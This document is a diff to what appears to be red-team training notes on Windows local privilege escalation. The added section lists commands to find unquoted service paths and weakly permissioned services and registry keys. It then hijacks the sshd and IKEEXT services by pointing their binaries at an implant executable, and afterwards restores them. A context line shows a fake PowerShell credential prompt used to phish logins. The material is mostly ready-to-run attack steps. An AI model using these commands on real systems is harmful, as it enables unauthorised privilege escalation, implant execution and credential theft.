@@ -71,6 +71,41 @@ C:\> powershell "$cred = $host.ui.promptforcredential('Failed Authentication',''
 
 ### Unsecured Objects
 
+- Search for unquoted service paths
+
+```
+C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """"
+```
+
+- Search for services with weak permissions
+
+```
+C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Everyone" *
+C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Users" *
+C:\> c:\rto\tools\si\accesschk.exe -accepteula -wuvc "Authenticated Users" *
+
+C:\> sc query sshd
+C:\> sc qc sshd
+C:\> sc config sshd binPath= "c:\rto\lpe\implant\implant.exe"
+C:\> sc start sshd
+
+C:\> sc stop sshd
+C:\> sc config sshd binPath= "c:\Program Files\OpenSSH\sshd.exe"
+```
+
+- Search for service Registry keys with weak permissions
+
+```
+C:\> c:\RTO\Tools\SI\accesschk.exe -accepteula -kvuqsw hklm\System\CurrentControlSet\services > c:\rto\regs.txt
+
+C:\> reg query HKLM\SYSTEM\CurrentControlSet\services\IKEEXT
+C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d C:\rto\lpe\implant\implantsrv.exe /f
+C:\> sc stop ikeext
+C:\> sc start ikeext
+
+C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d "%systemroot%\system32\svchost.exe -k netsvcs -p" /f
+```
+
 ### Execution Flow Hijacking
 
 ### Getting SYSTEM
